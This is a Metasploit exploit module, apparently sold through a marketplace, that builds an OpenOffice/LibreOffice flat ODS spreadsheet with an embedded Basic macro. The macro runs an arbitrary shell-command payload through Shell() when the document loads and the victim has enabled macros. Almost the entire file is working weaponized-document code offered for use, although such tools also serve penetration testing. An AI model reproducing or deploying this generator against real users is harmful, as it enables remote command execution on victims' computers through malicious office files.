##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/zip'

class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Remote::Seh
  include Msf::Exploit::Remote::Egghunter

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'OpenOffice/LibreOffice Flat ODS Macro Command Execution',
      'Description'    => %q{
      This module generates an OpenOffice/LibreOffice spreadsheet with a
      specified payload that will be executed when a user opens the document
      and runs the macro.

      This module generates a flat XML OpenOffice/LibreOffice spreadsheet
      document. When opened, the embedded payload will be run if the user
      also enables macros (this is not a default setting).

    Categories: Open Source

    Price: 4

    Video: https://asciinema.org/a/5ATkEB7q2Fa8jWI8Uns4Wtcb7

    OS: Multi

    Arch: Multi

    Requirements: Metasploit Framework

      },
      'License'        => 'VolatileMinds',
      'Author'         =>
        [
        ],
      'References'     =>
        [
        ],
        'Platform'          => [ 'unix', 'linux', 'windows', 'osx' ],
      'Arch' => ARCH_CMD,
      'Payload'    =>
    {
      'BadChars' => "",
      'Compat'     => {
      'PayloadType'  => 'cmd',
      'RequiredCmd'  => 'generic telnet bash netcat python perl',
    }},
      'Targets'        =>
        [
          [ 'Default', { }],
        ],
      'DisclosureDate' => '',
      'DefaultTarget'  => 0))

      register_options(
        [
          OptString.new('FILENAME', [ true, 'The output file name.', 'metasploit.ods']),
          OptString.new('EVENT', [true, 'The event to fire the shellcode on', 'dom:load'])
        ])
  end

  def exploit

    name = Rex::Text.rand_text_alpha(20)
    xml = %Q{<?xml version="1.0" encoding="UTF-8"?>
<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:style="urn:oasis:names:tc:opendocument:xmlns:style:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0" xmlns:fo="urn:oasis:names:tc:opendocument:xmlns:xsl-fo-compatible:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0" xmlns:number="urn:oasis:names:tc:opendocument:xmlns:datastyle:1.0" xmlns:presentation="urn:oasis:names:tc:opendocument:xmlns:presentation:1.0" xmlns:svg="urn:oasis:names:tc:opendocument:xmlns:svg-compatible:1.0" xmlns:chart="urn:oasis:names:tc:opendocument:xmlns:chart:1.0" xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" xmlns:math="http://www.w3.org/1998/Math/MathML" xmlns:form="urn:oasis:names:tc:opendocument:xmlns:form:1.0" xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" xmlns:config="urn:oasis:names:tc:opendocument:xmlns:config:1.0" xmlns:ooo="http://openoffice.org/2004/office" xmlns:ooow="http://openoffice.org/2004/writer" xmlns:oooc="http://openoffice.org/2004/calc" xmlns:dom="http://www.w3.org/2001/xml-events" xmlns:xforms="http://www.w3.org/2002/xforms" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:rpt="http://openoffice.org/2005/report" xmlns:of="urn:oasis:names:tc:opendocument:xmlns:of:1.2" xmlns:xhtml="http://www.w3.org/1999/xhtml" xmlns:grddl="http://www.w3.org/2003/g/data-view#" xmlns:tableooo="http://openoffice.org/2009/table" xmlns:drawooo="http://openoffice.org/2010/draw" xmlns:calcext="urn:org:documentfoundation:names:experimental:calc:xmlns:calcext:1.0" xmlns:loext="urn:org:documentfoundation:names:experimental:office:xmlns:loext:1.0" xmlns:field="urn:openoffice:names:experimental:ooo-ms-interop:xmlns:field:1.0" xmlns:formx="urn:openoffice:names:experimental:ooxml-odf-interop:xmlns:form:1.0" xmlns:css3t="http://www.w3.org/TR/css3-text/" office:version="1.2" office:mimetype="application/vnd.oasis.opendocument.spreadsheet">
 <office:scripts>
  <office:script script:language="ooo:Basic">
   <ooo:libraries xmlns:ooo="http://openoffice.org/2004/office" xmlns:xlink="http://www.w3.org/1999/xlink">
    <ooo:library-embedded ooo:name="Standard">
     <ooo:module ooo:name="#{name}">
      <ooo:source-code>REM  *****  BASIC  *****

Sub Main
  Shell(&quot;#{payload.encoded.gsub("\"", "\"\"").gsub("&", "&amp;").gsub("\"", "&quot;").gsub("'", "&#039;").gsub("<", "&lt;").gsub(">", "&gt;")}&quot;)
End Sub

      </ooo:source-code>
     </ooo:module>
    </ooo:library-embedded>
   </ooo:libraries>
  </office:script>
  <office:event-listeners>
   <script:event-listener script:language="ooo:script" script:event-name="#{datastore['EVENT']}" xlink:href="vnd.sun.star.script:Standard.#{name}.Main?language=Basic&amp;location=document" xlink:type="simple"/>
  </office:event-listeners>
 </office:scripts>
 <office:body>
  <office:spreadsheet>
   <table:calculation-settings table:automatic-find-labels="false" table:use-regular-expressions="false" table:use-wildcards="true"/>
   <table:table table:name="Sheet1" table:style-name="ta1">
    <table:table-column table:style-name="co1" table:default-cell-style-name="Default"/>
    <table:table-row table:style-name="ro1">
     <table:table-cell/>
    </table:table-row>
   </table:table>
   <table:named-expressions/>
  </office:spreadsheet>
 </office:body>
</office:document>
    }

    # Create the file
    print_status("Creating '#{datastore['FILENAME']}' file...")

    file_create(xml)
  end

end
